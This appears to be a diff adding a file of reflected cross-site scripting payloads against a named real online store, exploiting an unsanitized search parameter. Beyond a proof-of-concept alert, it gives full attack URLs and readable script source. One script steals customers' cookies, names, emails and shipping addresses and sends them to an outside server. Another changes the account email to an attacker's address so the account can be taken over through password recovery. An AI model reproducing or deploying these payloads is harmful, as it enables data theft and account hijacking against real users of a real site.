@@ -1,0 +1,66 @@
+//https://www.kontrolfreek.com XSS and Payloads
+
+//Injection point
+//GET variable o is not being sanitized properly before being rendered
+http://www.kontrolfreek.com/catalogsearch/result/?___SID=U&o=%3Cscript%3Ealert%28%27XSS%27%29;%3C/script%3E&q=Kontrol+Freek+Classic
+
+
+//This payload will steal user information and log it to a remote server
+//Remember to use https:// when fetching information from other pages!!
+https://www.kontrolfreek.com/catalogsearch/result/?___SID=U&o=<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script><script>$.get('https://www.kontrolfreek.com/customer/address/', function(data) {if(data.indexOf("<title>Address Book</title>") != -1) {var parsed = $("<div/>").append(data);var shipping = parsed.find("address").text();$.get('https://www.kontrolfreek.com/customer/account/edit/', function(data) {var parsed = $("<div/>").append(data);var email = parsed.find("%23email").val();var firstname = parsed.find("%23firstname").val();var lastname = parsed.find("%23lastname").val();document.location='http://plums-z0ne.net/kontrol.php?cookies='%2Bdocument.cookie%2B'%26fn='%2Bfirstname%2B'%26ln='%2Blastname%2B'%26email='%2Bemail%2B'%26shipping='%2Bshipping%2B'%26redirect=https://www.kontrolfreek.com';});} else {window.location = 'https://www.kontrolfreek.com';}});</script>&q=Kontrol+Freek+Classic
+
+//Payload Source
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+<script>
+$.get('https://www.kontrolfreek.com/customer/address/', function(data) {
+	if(data.indexOf("<title>Address Book</title>") != -1) {
+		var parsed = $("<div/>").append(data);
+		var shipping = parsed.find("address").text();
+		$.get('https://www.kontrolfreek.com/customer/account/edit/', function(data) {
+			var parsed = $("<div/>").append(data);
+			var email = parsed.find("%23email").val();
+			var firstname = parsed.find("%23firstname").val();
+			var lastname = parsed.find("%23lastname").val();
+			document.location='http://lol.net/kontrol.php?cookies='%2Bdocument.cookie%2B'%26fn='%2Bfirstname%2B'%26ln='%2Blastname%2B'%26email='%2Bemail%2B'%26shipping='%2Bshipping%2B'%26redirect=https://www.kontrolfreek.com';
+		});
+	} else {
+		window.location = 'https://www.kontrolfreek.com';
+	}
+});
+</script>
+
+//Hijack accounts
+//To hijack accounts you can use an Ajax request to change the email on the target account
+//You can then do a password recovery to gain access to that account
+
+//Example URL
+//Remember to use https:// when fetching information!!! 
+https://www.kontrolfreek.com/catalogsearch/result/?___SID=U&o=<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script><script>var new_email = "dkcy.plum.st505@gmail.com";$.get('https://www.kontrolfreek.com/customer/account/edit/', function(data) {if(data.indexOf("<title>Account Information</title>") != -1) {var parsed = $("<div/>").append(data);var formkey = parsed.find("input[name=form_key]").val();var firstname = parsed.find("%23firstname").val();var lastname = parsed.find("%23lastname").val();var email = parsed.find("%23email").val();$.ajax({type: "POST",url: "https://www.kontrolfreek.com/customer/account/editPost/",data: {form_key:formkey,firstname:firstname,lastname:lastname,email:new_email}}).done(function(result) {if(result.indexOf("<span>The account information has been saved.</span>") != -1) {document.location='http://lol.net/kontrol2.php?code=1%26oe='%2Bemail%2B+'%26ne='%2Bnew_email%2B'%26redirect=https://www.kontrolfreek.com';} else {document.location='http://lol.net/kontrol2.php?code=2%26oe='%2Bemail%2B+'%26ne='%2Bnew_email%2B'%26redirect=https://www.kontrolfreek.com';}});} else {window.location = 'https://www.kontrolfreek.com';}});</script>&q=Kontrol+Freek+Classic
+
+//Payload Source
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+<script>
+var new_email = "lol@gmail.com";
+$.get('https://www.kontrolfreek.com/customer/account/edit/', function(data) {
+	if(data.indexOf("<title>Account Information</title>") != -1) {
+		var parsed = $("<div/>").append(data);
+		var formkey = parsed.find("input[name=form_key]").val();
+		var firstname = parsed.find("%23firstname").val();
+		var lastname = parsed.find("%23lastname").val();
+		var email = parsed.find("%23email").val();
+		$.ajax({
+			type: "POST",
+			url: "https://www.kontrolfreek.com/customer/account/editPost/",
+			data: {form_key:formkey,firstname:firstname,lastname:lastname,email:new_email}
+		}).done(function(result) {
+			if(result.indexOf("<span>The account information has been saved.</span>") != -1) {
+				document.location='http://lol.net/kontrol2.php?code=1%26oe='%2Bemail%2B+'%26ne='%2Bnew_email%2B'%26redirect=https://www.kontrolfreek.com';
+			} else {
+				document.location='http://lol.net/kontrol2.php?code=2%26oe='%2Bemail%2B+'%26ne='%2Bnew_email%2B'%26redirect=https://www.kontrolfreek.com';
+			}
+		});
+	} else {
+		window.location = 'https://www.kontrolfreek.com';
+	}
+});
+</script>
